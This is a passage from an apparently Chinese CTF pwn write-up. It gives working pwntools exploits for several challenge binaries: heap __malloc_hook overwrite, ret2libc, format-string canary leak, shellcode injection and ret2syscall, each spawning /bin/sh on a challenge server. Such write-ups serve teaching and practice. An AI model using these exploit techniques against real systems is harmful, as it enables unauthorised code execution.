class="hljs-comment">#0</span><br>    <span class="hljs-comment">#通过编辑chunk1溢出chunk2的size的inues位为0,注意chunk2的prevsize位为chunk0size+chunk2size</span><br>    pay0 = <span class="hljs-string">'a'</span>*<span class="hljs-number">0xf0</span> + p64(<span class="hljs-number">0x200</span>)<br>    edit(<span class="hljs-number">1</span>,pay0)<br>    delete(<span class="hljs-number">2</span>) <span class="hljs-comment">#2</span><br><br>    <span class="hljs-comment">#泄露libc</span><br>    add(<span class="hljs-number">0xf8</span>,<span class="hljs-string">"aaaa"</span>) <span class="hljs-comment">#0</span><br>    show(<span class="hljs-number">1</span>)<br>    p.recvuntil(<span class="hljs-string">'content:\n'</span>)<br>    main_arena = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">'\x00'</span>))<br>    <span class="hljs-comment">#print("main_arena88",hex(main_arena))</span><br>    libc_base = main_arena - <span class="hljs-number">0x3c4b78</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">"libc_base"</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>    malloc_hook = libc_base + libc.sym[<span class="hljs-string">'__malloc_hook'</span>]<br>    realloc_hook = libc_base + libc.sym[<span class="hljs-string">'realloc'</span>]<br>    one = [<span class="hljs-number">0x45226</span>,<span class="hljs-number">0x4527a</span>,<span class="hljs-number">0xf03a4</span>,<span class="hljs-number">0xf1247</span>]<br><br>    one_gadget = libc_base + one[<span class="hljs-number">1</span>]<br><br>    <span class="hljs-comment">#修改chunk1的fd改为malloc_hook - 0x23</span><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">b'aaa'</span>) <span class="hljs-comment">#2-&gt;1</span><br>    delete(<span class="hljs-number">2</span>)<br>    edit(<span class="hljs-number">1</span>,p64(malloc_hook-<span class="hljs-number">0x23</span>))<br><br>    add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'aaaa'</span>) <span class="hljs-comment">#2</span><br><br>    payload = <span class="hljs-string">'a'</span>*(<span class="hljs-number">0x23</span>-<span class="hljs-number">0x10</span>-<span class="hljs-number">0x8</span>) + p64(one_gadget) + p64(realloc_hook+<span class="hljs-number">8</span>)<br>    <span class="hljs-comment">#debug()</span><br>    add(<span class="hljs-number">0x68</span>,payload)<br><br>    cmd(<span class="hljs-string">"1"</span>)<br>    p.recvuntil(<span class="hljs-string">'Please give me a name for item:\n'</span>)<br>    p.sendline(<span class="hljs-string">'aaaa'</span>)<br>    p.interactive()<br><br>connect()<br>pwn()<br><br><span class="hljs-comment"># for i in range(4):</span><br><span class="hljs-comment">#     for j in [2,4,6,8,10]:</span><br><span class="hljs-comment">#         try:</span><br><span class="hljs-comment">#             print("i :",i)</span><br><span class="hljs-comment">#             print("j :",j)</span><br><span class="hljs-comment">#             p = process('./emo_chunk')</span><br><span class="hljs-comment">#             pwn(i,int(j))</span><br><span class="hljs-comment">#         except:</span><br><span class="hljs-comment">#             p.close()</span><br><span class="hljs-comment">#注释为暴力调栈,得出i = 1, j = 8</span><br><br><span class="hljs-string">'''</span><br><span class="hljs-string">0x45226	execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rax == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4527a	execve("/bin/sh", rsp+0x30, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x30] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf03a4	execve("/bin/sh", rsp+0x50, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x50] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xf1247	execve("/bin/sh", rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string">'''</span><br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="fish"><a href="#fish" class="headerlink" title="fish"></a>fish</h2><h3 id="程序保护-3"><a href="#程序保护-3" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-3"><a href="#解题思路-3" class="headerlink" title="解题思路"></a>解题思路</h3><p>函数存在gets，溢出控制返回地址为bss段上再执行一次gets。直接溢出输入system(“/bin/sh”)</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2060</span>)<br><span class="hljs-comment">#p = process('./fish')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./fish'</span>)<br>sys = elf.plt[<span class="hljs-string">'system'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(sys))<br>get_plt = elf.plt[<span class="hljs-string">'gets'</span>]<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(get_plt))<br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>bss = <span class="hljs-number">0x0804A040</span><br>p.sendline(<span class="hljs-string">"123"</span>)<br>payload = <span class="hljs-string">b'a'</span>*<span class="hljs-number">0x112</span> + p32(get_plt) + p32(sys) + p32(bss) + p32(bss)<br>p.recvuntil(<span class="hljs-string">b'How many fish does the kitten eat\n'</span>)<br>p.sendline(payload)<br>p.sendline(<span class="hljs-string">b'/bin/sh'</span>)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="format-ret2libc"><a href="#format-ret2libc" class="headerlink" title="format_ret2libc"></a>format_ret2libc</h2><h3 id="程序保护-4"><a href="#程序保护-4" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-4"><a href="#解题思路-4" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p>
<h3 id="exp-4"><a href="#exp-4" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2107</span>)<br><span class="hljs-comment">#p = process('./format_ret2libc')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>libc = ELF(<span class="hljs-string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)<br>elf = ELF(<span class="hljs-string">'./format_ret2libc'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x40084B</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400943</span><br><br>payload1 = <span class="hljs-string">"%39$p"</span><br><span class="hljs-comment">#p.recvuntil("Say some words\n")</span><br>p.sendline(payload1)<br>p.recvuntil(<span class="hljs-string">"0x"</span>)<br>canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">hex</span>(canary))<br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - 	<span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>-<span class="hljs-number">8</span>) + p64(canary) + <span class="hljs-string">b"a"</span> * <span class="hljs-number">8</span><br>payload3 += p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)<br><br>p.sendlineafter(<span class="hljs-string">"What's your name?\n"</span>, payload3)<br><br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="Game"><a href="#Game" class="headerlink" title="Game"></a>Game</h2><h3 id="程序保护-5"><a href="#程序保护-5" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-5"><a href="#解题思路-5" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p>
<h3 id="exp-5"><a href="#exp-5" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2064</span>)<br><span class="hljs-comment">#p = process('./Game')</span><br>elf = ELF(<span class="hljs-string">'./Game'</span>)<br><br>puts_plt = elf.plt[<span class="hljs-string">'puts'</span>]<br>puts_got = elf.got[<span class="hljs-string">'puts'</span>]<br>main_addr = elf.symbols[<span class="hljs-string">'main'</span>]<br>start = <span class="hljs-number">0x080485F4</span><br><br>offset = <span class="hljs-number">0x64</span> + <span class="hljs-number">8</span> + <span class="hljs-number">4</span><br><br>p.recvuntil(<span class="hljs-string">'Do you play game?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">'Do you think playing games will affect your learning?\n'</span>)<br>p.sendline(<span class="hljs-string">"yes"</span>)<br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload = <span class="hljs-string">b'a'</span>*offset + p32(puts_plt) + p32(start) + p32(puts_got)<br><span class="hljs-comment">#payload = p32(puts_got)</span><br><span class="hljs-comment">#gdb.attach(p)</span><br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">'\n'</span>)<br>puts_addr = u32(p.recv()[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>])<br>log.info(<span class="hljs-string">'puts -&gt; %x'</span>,puts_addr)<br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - <span class="hljs-number">0x05f150</span><br>system_addr = libc + <span class="hljs-number">0x03a950</span><br>binsh_addr = libc + <span class="hljs-number">0x15912b</span><br><br><br>p.recvuntil(<span class="hljs-string">"I think the same as you!\n"</span>)<br>payload2 = <span class="hljs-string">b'a'</span>* offset + p32(system_addr) + p32(<span class="hljs-number">0xdeadbeef</span>) + p32(binsh_addr)<br>p.sendline(payload2)<br><br>p.interactive()<br></code></pre></td></tr></tbody></table></figure>



<h2 id="name4"><a href="#name4" class="headerlink" title="name4"></a>name4</h2><h3 id="程序保护-6"><a href="#程序保护-6" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h3><p>绕过检查的shellcode</p>
<h3 id="exp-6"><a href="#exp-6" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2116</span>)<br><span class="hljs-comment">#p = process('./name4')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./name4'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"Enter your name:\n"</span>)<br>p.sendline(<span class="hljs-string">'\x00'</span>+shellcode)<br>goal = <span class="hljs-number">0x0804A0E0</span><br>goal1 = <span class="hljs-number">0x0804A080</span> + <span class="hljs-number">1</span><br>p.recvuntil(<span class="hljs-string">'Enter your best friend name:\n'</span>)<br>p.sendline(shellcode)<br><br>p.recvuntil(<span class="hljs-string">'give you stack overflow:\n'</span>)<br>payload = <span class="hljs-string">'a'</span>*<span class="hljs-number">0x20</span> + p32(<span class="hljs-number">0xdeadbeff</span>) + p32(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="play"><a href="#play" class="headerlink" title="play"></a>play</h2><h3 id="程序保护-7"><a href="#程序保护-7" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br>    RWX:      Has RWX segments<br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h3><p>通过往bss段上写shellcode再跳转执行</p>
<h3 id="exp-7"><a href="#exp-7" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2063</span>)<br><span class="hljs-comment">#p = process('./play')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br>elf = ELF(<span class="hljs-string">'./play'</span>)<br><br>shellcode = asm(shellcraft.sh())<br>p.recvuntil(<span class="hljs-string">"I think you must enjoy playing.\n"</span>)<br>p.sendline(shellcode)<br>goal = <span class="hljs-number">0x6010A0</span><br>p.recvuntil(<span class="hljs-string">'Name your favorite game?\n'</span>)<br>payload = <span class="hljs-string">b'a'</span>*(<span class="hljs-number">0x30</span>+<span class="hljs-number">8</span>) + p64(goal)<br><span class="hljs-comment">#gdb.attach(p)</span><br><br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="ret2syscall"><a href="#ret2syscall" class="headerlink" title="ret2syscall"></a>ret2syscall</h2><h3 id="程序保护-8"><a href="#程序保护-8" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     i386<span class="hljs-number">-32</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX disabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x8048000</span>)</span><br>    RWX:      Has RWX segments<br><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2syscall 32位的执行 (0xb，0，0，binsh) 再调用80号中断</p>
<h3 id="exp-8"><a href="#exp-8" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> LibcSearcher<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2109</span>)<br><span class="hljs-comment">#p = process('./ret2syscall_32')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'i386'</span>)<br>elf = ELF(<span class="hljs-string">'./ret2syscall_32'</span>)<br><br>offset = <span class="hljs-number">0x208</span> + <span class="hljs-number">4</span><br>binsh_addr = <span class="hljs-number">0x080EA068</span><br>pop_eax = <span class="hljs-number">0x080b8576</span><br>pop_edx_ecx_ebx = <span class="hljs-number">0x0806f250</span><br>int80_addr = <span class="hljs-number">0x0806cea3</span><br><br>payload = <span class="hljs-string">b'a'</span>*offset + p32(pop_eax) + p32(<span class="hljs-number">0xb</span>)<br>payload += p32(pop_edx_ecx_ebx) + p32(<span class="hljs-number">0x0</span>) + p32(<span class="hljs-number">0x0</span>) + p32(binsh_addr) + p32(int80_addr)<br>p.sendline(payload)<br><br>p.interactive()<br><br></code></pre></td></tr></tbody></table></figure>



<h2 id="sleep"><a href="#sleep" class="headerlink" title="sleep"></a>sleep</h2><h3 id="程序保护-9"><a href="#程序保护-9" class="headerlink" title="程序保护"></a>程序保护</h3><figure class="highlight c"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">Arch:     amd64<span class="hljs-number">-64</span>-little<br>    RELRO:    Partial RELRO<br>    Stack:    No canary found<br>    NX:       NX enabled<br>    PIE:      No <span class="hljs-title function_">PIE</span> <span class="hljs-params">(<span class="hljs-number">0x400000</span>)</span><br></code></pre></td></tr></tbody></table></figure>

<h3 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h3><p>ret2libc</p>
<h3 id="exp-9"><a href="#exp-9" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/python</span><br><span class="hljs-comment"># -*- coding: utf-8 -*-</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>p = remote(<span class="hljs-string">'123.60.135.228'</span>,<span class="hljs-number">2057</span>)<br><span class="hljs-comment">#p = process('./sleep')</span><br>context(log_level = <span class="hljs-string">'debug'</span>, os = <span class="hljs-string">'linux'</span>, arch = <span class="hljs-string">'amd64'</span>)<br><span class="hljs-comment">#libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')</span><br>elf = ELF(<span class="hljs-string">'./sleep'</span>)<br><br>puts_got = elf.got[<span class="hljs-string">"puts"</span>]<br>puts_plt = elf.plt[<span class="hljs-string">"puts"</span>]<br>vuln_addr = <span class="hljs-number">0x4006BD</span><br>pop_rdi_ret = <span class="hljs-number">0x0000000000400783</span><br><br><br>payload2 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload2 += p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(vuln_addr)<br>p.sendlineafter(<span class="hljs-string">"Please cherish every second of sleeping time !!!\n"</span>, payload2)<br><br>puts_addr = u64(p.recvuntil(<span class="hljs-string">'\x7f'</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b'\x00'</span>))<br>log.info(<span class="hljs-string">"puts_addr -&gt; %x"</span>,puts_addr)<br><br><span class="hljs-comment"># libcbase = puts_addr - libc.symbols['puts']</span><br><span class="hljs-comment"># system_addr = libcbase + libc.symbols['system']</span><br><span class="hljs-comment"># binsh_addr = libcbase + next(libc.search("/bin/sh"))</span><br><br><span class="hljs-comment"># libc = LibcSearcher('puts', puts_addr)</span><br><span class="hljs-comment"># libcbase = puts_addr - libc.dump('puts')</span><br><span class="hljs-comment"># system_addr = libcbase + libc.dump('system')</span><br><span class="hljs-comment"># binsh_addr = libcbase + libc.dump('str_bin_sh')</span><br><br>libc = puts_addr - 	<span class="hljs-number">0x06f6a0</span><br>system_addr = libc + <span class="hljs-number">0x0453a0</span><br>binsh_addr = libc + <span class="hljs-number">0x18ce57</span><br><br>payload3 = <span class="hljs-string">b"a"</span> * (<span class="hljs-number">0x70</span>+<span class="hljs-number">8</span>)<br>payload3 += 